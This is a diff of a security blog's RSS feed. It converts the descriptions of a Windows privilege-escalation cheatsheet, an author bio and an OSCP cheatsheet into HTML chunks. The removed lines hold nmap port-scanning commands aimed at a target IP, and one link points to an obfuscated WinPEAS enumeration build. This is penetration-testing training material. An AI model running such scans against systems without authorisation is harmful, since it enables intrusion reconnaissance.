-This post will help you with local enumeration as well as escalate your privileges further.
-Usage of different enumeration scripts and tools is encouraged, my favourite is WinPEAS. If confused which executable to use, use this
-Keep in mind:
-To exploit services or registry, you require: appropriate write permissions service start permission service stop permission Look for non-standard programs on the system Note: This is a live document.</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;windows-privilege-escalation-cheatsheet&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Windows Privilege Escalation Cheatsheet
+  &lt;a href=&#34;#windows-privilege-escalation-cheatsheet&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;Latest updated as of: &lt;em&gt;12 / June / 2022&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;So you got a shell, what &lt;em&gt;now&lt;/em&gt;?&lt;br&gt;
+This post will help you with local enumeration as well as escalate your privileges further.&lt;/p&gt;
+&lt;p&gt;Usage of different enumeration scripts and tools is encouraged, my favourite is &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS&#34;&gt;WinPEAS&lt;/a&gt;. If confused which executable to use, use &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe&#34;&gt;this&lt;/a&gt;&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -242,10 +1139,24 @@ To exploit services or registry, you require: appropriate write permissions serv
       <pubDate>Thu, 25 Jun 2020 09:00:37 +0000</pubDate>
       
       <guid>http://localhost:1313/whoami/</guid>
-      <description>Who Am I? Hi, my name is Karan Bhayani. I am a security professional who likes learning new things.
-I like to believe that only understanding how to attack and/or defend something is not sufficient and we should understand how things truly work. I am currently interested in Windows and Active Directory. Here are few papers I hold that says I know something
-&amp;hellip;and CRTP
-Connect With Me Have a question, suggestion, constructive criticism, or just wanna chat?</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;who-am-i&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;Who Am I?
+  &lt;a href=&#34;#who-am-i&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;p&gt;Hi, my name is Nomi &amp;ldquo;Karan&amp;rdquo; Bhayani. I am a security professional who likes learning new things.&lt;/p&gt;
+&lt;p&gt;I like to believe that only understanding how to attack and/or defend something is not sufficient and we should understand how things truly work. I am currently interested in Windows and Active Directory. &lt;br&gt;&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -254,13 +1165,39 @@ Connect With Me Have a question, suggestion, constructive criticism, or just wan
       <pubDate>Thu, 25 Jun 2020 08:51:22 +0000</pubDate>
       
       <guid>http://localhost:1313/oscp-cheatsheet/</guid>
-      <description>OSCP Cheatsheet General Enumeration - Nmap Replace $ip with target IP
-Initial scan
-nmap -Pn -n -vvv -oN nmap/initial $ipIf no ports are found, scan in parts
-nmap -Pn -n -vvv -p1-500 -oN nmap/partial $ipScan all ports
-nmap -Pn -n -vvv -p- -oN nmap/allports $ipTargeted scanning
-nmap -Pn -n -vvv -p22,80 -oN nmap/targeted $ipUDP Scanning
-sudo nmap -Pn -n -vvv -sU -oN nmap/udp $ipAutomated nmap scanning (my preference is nmapAutomator, never missed a port)</description>
+      <description>&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;oscp-cheatsheet&#34; --&gt;
+
+&lt;h1 class=&#34;header-anchor-wrapper&#34;&gt;OSCP Cheatsheet
+  &lt;a href=&#34;#oscp-cheatsheet&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h1&gt;
+
+&lt;!-- end-chunk --&gt;
+&lt;!-- begin-chunk data-anchor=&#34;general-enumeration---nmap&#34; --&gt;
+
+&lt;h2 class=&#34;header-anchor-wrapper&#34;&gt;General Enumeration - Nmap
+  &lt;a href=&#34;#general-enumeration---nmap&#34; class=&#34;header-anchor-link&#34;&gt;
+&lt;svg
+    xmlns=&#34;http://www.w3.org/2000/svg&#34;
+    width=&#34;1rem&#34; height=&#34;1rem&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34;
+    stroke=&#34;currentColor&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;
+    stroke-linejoin=&#34;round&#34;&gt;
+    &lt;line x1=&#34;4&#34; y1=&#34;9&#34; x2=&#34;20&#34; y2=&#34;9&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;4&#34; y1=&#34;15&#34; x2=&#34;20&#34; y2=&#34;15&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;10&#34; y1=&#34;3&#34; x2=&#34;8&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;&lt;line x1=&#34;16&#34; y1=&#34;3&#34; x2=&#34;14&#34; y2=&#34;21&#34;&gt;&lt;/line&gt;
+&lt;/svg&gt;
+
+&lt;/a&gt;
+&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Replace $ip with target IP&lt;/strong&gt;&lt;/p&gt;</description>
     </item>
     
   </channel>
